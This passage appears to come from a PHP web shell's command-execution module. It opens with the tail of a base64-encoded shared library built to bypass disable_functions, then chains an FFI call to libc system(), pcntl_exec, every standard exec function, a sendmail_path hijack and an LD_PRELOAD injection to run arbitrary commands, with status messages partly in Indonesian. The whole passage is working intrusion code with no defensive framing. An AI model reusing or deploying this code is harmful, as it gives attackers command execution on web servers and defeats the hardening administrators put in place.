AAAAAAEA8f8WAQAA4AQAAJQAAAASAAsAHgEAAAAAAAAAAAAAIAAAAC0BAAAAAAAAAAAAACAAAABBAQAAAAAAAAAAAAASAAAAUwEAALgFAAAAAAAAEgAMAFkBAAAAAAAAAAAAABIAAABrAQAAAAAAAAAAAAARAAAAfgEAAAAAAAAAAAAAEgAAAJABAAD8FgAAAAAAABAA8f+cAQAABBcAAAAAAAAQAPH/oQEAAAAAAAAAAAAAEQAAALYBAAD8FgAAAAAAABAA8f+9AQAAAAAAAAAAAAAiAAAA2QEAAHwDAAAAAAAAEgAJAABjcnRzdHVmZi5jAF9fQ1RPUl9MSVNUX18AX19EVE9SX0xJU1RfXwBfX0pDUl9MSVNUX18AX19kb19nbG9iYWxfZHRvcnNfYXV4AGNvbXBsZXRlZC41OTg2AGR0b3JfaWR4LjU5ODgAZnJhbWVfZHVtbXkAX19DVE9SX0VORF9fAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18AX19kb19nbG9iYWxfY3RvcnNfYXV4AGJ5cGFzc19kaXNhYmxlZnVuYy5jAF9HTE9CQUxfT0ZGU0VUX1RBQkxFXwBfX2Rzb19oYW5kbGUAX19EVE9SX0VORF9fAF9faTY4Ni5nZXRfcGNfdGh1bmsuYngAX0RZTkFNSUMAcHJlbG9hZABfX2dtb25fc3RhcnRfXwBfSnZfUmVnaXN0ZXJDbGFzc2VzAGdldGVudkBAR0xJQkNfMi4wAF9maW5pAHN5c3RlbUBAR0xJQkNfMi4wAGVudmlyb25AQEdMSUJDXzIuMABzdHJzdHJAQEdMSUJDXzIuMABfX2Jzc19zdGFydABfZW5kAF9fZW52aXJvbkBAR0xJQkNfMi4wAF9lZGF0YQBfX2N4YV9maW5hbGl6ZUBAR0xJQkNfMi4xLjMAX2luaXQA';
    global $soPath;
    file_put_contents($soPath, base64_decode($content));
}

// --- Helper: all exec methods including FFI and pcntl ---
function try_direct_exec($cmd, $outPath = '') {
    $disabled = array_map('trim', explode(',', ini_get('disable_functions')));

    // 1. PHP FFI - bypass via libc system() directly (PHP 7.4+)
    if (extension_loaded('ffi') && class_exists('FFI')) {
        try {
            $ffi = FFI::cdef("int system(const char *command);", "libc.so.6");
            if ($outPath) {
                $ffi->system($cmd . ' > ' . $outPath . ' 2>&1');
                if (file_exists($outPath)) {
                    $out = file_get_contents($outPath); @unlink($outPath);
                    if (trim($out) !== '') return ['method'=>'ffi', 'output'=>$out];
                }
            }
        } catch (Throwable $e) {}
    }

    // 2. pcntl_fork + pcntl_exec (PHP CLI/FPM)
    if (!in_array('pcntl_fork', $disabled) && function_exists('pcntl_fork') && $outPath) {
        $pid = @pcntl_fork();
        if ($pid === 0) {
            @pcntl_exec('/bin/sh', ['-c', $cmd . ' > ' . $outPath . ' 2>&1']);
            exit(0);
        } elseif ($pid > 0) {
            @pcntl_waitpid($pid, $status);
            if (file_exists($outPath)) {
                $out = file_get_contents($outPath); @unlink($outPath);
                if (trim($out) !== '') return ['method'=>'pcntl', 'output'=>$out];
            }
        }
    }

    // 3. Standard exec functions
    if (!in_array('exec', $disabled) && function_exists('exec')) {
        $lines = []; $ret = 0;
        exec($cmd . ' 2>&1', $lines, $ret);
        if (!empty($lines)) return ['method'=>'exec', 'output'=>implode("\n", $lines)];
    }
    if (!in_array('shell_exec', $disabled) && function_exists('shell_exec')) {
        $out = @shell_exec($cmd . ' 2>&1');
        if ($out !== null && trim($out) !== '') return ['method'=>'shell_exec', 'output'=>$out];
    }
    if (!in_array('popen', $disabled) && function_exists('popen')) {
        $fp = @popen($cmd . ' 2>&1', 'r');
        if ($fp) {
            $out = stream_get_contents($fp); pclose($fp);
            if (trim($out) !== '') return ['method'=>'popen', 'output'=>$out];
        }
    }
    if (!in_array('proc_open', $disabled) && function_exists('proc_open')) {
        $pipes = [];
        $proc  = @proc_open($cmd, [1=>['pipe','w'], 2=>['pipe','w']], $pipes);
        if (is_resource($proc)) {
            $out  = stream_get_contents($pipes[1]); fclose($pipes[1]);
            $out .= stream_get_contents($pipes[2]); fclose($pipes[2]);
            proc_close($proc);
            if (trim($out) !== '') return ['method'=>'proc_open', 'output'=>$out];
        }
    }
    if (!in_array('system', $disabled) && function_exists('system')) {
        ob_start(); @system($cmd . ' 2>&1'); $out = ob_get_clean();
        if (trim($out) !== '') return ['method'=>'system', 'output'=>$out];
    }
    if (!in_array('passthru', $disabled) && function_exists('passthru')) {
        ob_start(); @passthru($cmd . ' 2>&1'); $out = ob_get_clean();
        if (trim($out) !== '') return ['method'=>'passthru', 'output'=>$out];
    }
    return false;
}

if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
    $arch_str    = is_64bit() ? '64bit' : '32bit';
    $sendmail    = trim((string)@ini_get('sendmail_path'));
    $disabled_fn = (string)ini_get('disable_functions');
    $open_basedir = (string)ini_get('open_basedir');

    echo "<p><b>Debug:</b> tmpDir={$tmpDir} | arch={$arch_str}</p>";
    echo "<p><b>sendmail_path:</b> " . htmlspecialchars($sendmail ?: '(not set)') . "</p>";
    echo "<p><b>disable_functions:</b> " . htmlspecialchars(trim($disabled_fn) ?: '(none)') . "</p>";
    @ob_flush(); @flush();

    $success = false;

    // ====================================================
    // METHOD 1: sendmail_path hijack (BEST for setuid sendmail)
    // Override sendmail_path to our own command, then call mail()
    // PHP forks and execs our command directly — no LD_PRELOAD needed!
    // ====================================================
    echo "<p><b>[1] sendmail_path hijack...</b></p>";
    @ob_flush(); @flush();

    if (function_exists('mail')) {
        // Escape for shell
        $escaped_cmd = str_replace("'", "'\\''", $cmd);
        $escaped_out = str_replace("'", "'\\''", $outPath);

        // Set sendmail_path to our command
        @ini_set('sendmail_path', "/bin/sh -c '" . $escaped_cmd . " > " . $escaped_out . " 2>&1'");

        // Trigger — PHP will fork and exec our sendmail_path
        @mail('a@b.c', '', '');

        // Wait for output
        usleep(500000);
        $waited = 0.5;
        while (!file_exists($outPath) && $waited < 6) { usleep(500000); $waited += 0.5; }

        if (file_exists($outPath) && filesize($outPath) > 0) {
            $out_content = file_get_contents($outPath);
            echo "<p style='color:green;'><b>&#10003; sendmail_path hijack berhasil!</b></p>";
            echo "<pre style='color:#0f0;width:100%;white-space:pre-wrap;word-break:break-all;font:13px Monaco,Consolas,monospace;background:#111;padding:8px;border:1px solid #333;'>" . htmlspecialchars($out_content) . "</pre>";
            @unlink($outPath);
            $success = true;
        } else {
            echo "<p style='color:orange;'>sendmail_path hijack: output file tidak muncul setelah {$waited}s.</p>";
            @unlink($outPath);
        }

        // Restore sendmail_path
        @ini_set('sendmail_path', $sendmail);
    } else {
        echo "<p style='color:red;'>mail() tidak tersedia.</p>";
    }

    if ($success) die();

    // ====================================================
    // METHOD 2: Direct exec via try-catch (prevents fatal crash)
    // ====================================================
    echo "<p><b>[2] Direct exec functions (try-catch protected)...</b></p>";
    @ob_flush(); @flush();

    $exec_methods = ['exec', 'shell_exec', 'popen', 'proc_open', 'system', 'passthru'];
    $available = [];
    foreach ($exec_methods as $fn) {
        $available[$fn] = function_exists($fn);
    }
    echo "<p style='color:gray;'>function_exists: " . implode(', ', array_map(function($k,$v){return "$k=".($v?'Y':'N');}, array_keys($available), $available)) . "</p>";
    @ob_flush(); @flush();

    // Try each in try-catch to prevent fatal errors
    if ($available['exec']) {
        try { $lines=[]; @exec($cmd.' 2>&1', $lines); $o=implode("\n",$lines);
            if(trim($o)!==''){echo"<p style='color:green;'><b>&#10003; exec</b></p><pre style='color:#0f0;background:#111;padding:8px;white-space:pre-wrap;word-break:break-all;font:13px monospace;'>".htmlspecialchars($o)."</pre>";$success=true;}
        } catch(\Throwable $e){echo"<p>exec: ".htmlspecialchars($e->getMessage())."</p>";}
    }
    if(!$success && $available['shell_exec']) {
        try { $o=@shell_exec($cmd.' 2>&1');
            if($o!==null&&trim($o)!==''){echo"<p style='color:green;'><b>&#10003; shell_exec</b></p><pre style='color:#0f0;background:#111;padding:8px;white-space:pre-wrap;word-break:break-all;font:13px monospace;'>".htmlspecialchars($o)."</pre>";$success=true;}
        } catch(\Throwable $e){echo"<p>shell_exec: ".htmlspecialchars($e->getMessage())."</p>";}
    }
    if(!$success && $available['popen']) {
        try { $fp=@popen($cmd.' 2>&1','r'); if($fp){$o=stream_get_contents($fp);pclose($fp);
            if(trim($o)!==''){echo"<p style='color:green;'><b>&#10003; popen</b></p><pre style='color:#0f0;background:#111;padding:8px;white-space:pre-wrap;word-break:break-all;font:13px monospace;'>".htmlspecialchars($o)."</pre>";$success=true;}}
        } catch(\Throwable $e){echo"<p>popen: ".htmlspecialchars($e->getMessage())."</p>";}
    }
    if(!$success && $available['proc_open']) {
        try { $pp=[];$pc=@proc_open($cmd,[1=>['pipe','w'],2=>['pipe','w']],$pp);
            if(is_resource($pc)){$o=stream_get_contents($pp[1]);fclose($pp[1]);$o.=stream_get_contents($pp[2]);fclose($pp[2]);proc_close($pc);
            if(trim($o)!==''){echo"<p style='color:green;'><b>&#10003; proc_open</b></p><pre style='color:#0f0;background:#111;padding:8px;white-space:pre-wrap;word-break:break-all;font:13px monospace;'>".htmlspecialchars($o)."</pre>";$success=true;}}
        } catch(\Throwable $e){echo"<p>proc_open: ".htmlspecialchars($e->getMessage())."</p>";}
    }
    if(!$success && $available['system']) {
        try { ob_start();@system($cmd.' 2>&1');$o=ob_get_clean();
            if(trim($o)!==''){echo"<p style='color:green;'><b>&#10003; system</b></p><pre style='color:#0f0;background:#111;padding:8px;white-space:pre-wrap;word-break:break-all;font:13px monospace;'>".htmlspecialchars($o)."</pre>";$success=true;}
        } catch(\Throwable $e){echo"<p>system: ".htmlspecialchars($e->getMessage())."</p>";}
    }
    if(!$success && $available['passthru']) {
        try { ob_start();@passthru($cmd.' 2>&1');$o=ob_get_clean();
            if(trim($o)!==''){echo"<p style='color:green;'><b>&#10003; passthru</b></p><pre style='color:#0f0;background:#111;padding:8px;white-space:pre-wrap;word-break:break-all;font:13px monospace;'>".htmlspecialchars($o)."</pre>";$success=true;}
        } catch(\Throwable $e){echo"<p>passthru: ".htmlspecialchars($e->getMessage())."</p>";}
    }

    if ($success) die();

    // ====================================================
    // METHOD 3: LD_PRELOAD bypass (fallback for non-setuid sendmail)
    // ====================================================
    echo "<p><b>[3] LD_PRELOAD bypass...</b></p>";
    @ob_flush(); @flush();

    if (is_64bit()) { release64(); } else { release86(); }
    @chmod($soPath, 0755);

    if (!file_exists($soPath)) {
        echo "<p style='color:red;'>Failed to write .so</p>";
    } else {
        echo "<p>.so written: {$soPath} (" . filesize($soPath) . " bytes)</p>";

        putenv("EVIL_CMDLINE=" . $cmd . " > " . $outPath . " 2>&1");
        putenv("LD_PRELOAD=" . $soPath);

        // Restore original sendmail_path for LD_PRELOAD trigger
        @ini_set('sendmail_path', $sendmail);
        $used = trigger_preload();

        if ($used !== false) {
            echo "<p>Triggered via: <b>{$used}</b></p>";
            $waited = 0;
            while (!file_exists($outPath) && $waited < 5) { usleep(500000); $waited += 0.5; }
            if (file_exists($outPath) && filesize($outPath) > 0) {
                echo "<pre style='color:#0f0;background:#111;padding:8px;white-space:pre-wrap;word-break:break-all;font:13px monospace;'>" . htmlspecialchars(file_get_contents($outPath)) . "</pre>";
                @unlink($outPath); @unlink($soPath);
                die();
            } else {
                echo "<p style='color:orange;'>Output file tidak muncul.</p>";
            }
        }
        @unlink($soPath);
    }

    echo "<p style='color:red;'><b>&#10007; Semua metode gagal.</b></p>";

} else {
    echo "Only on Linux";
}


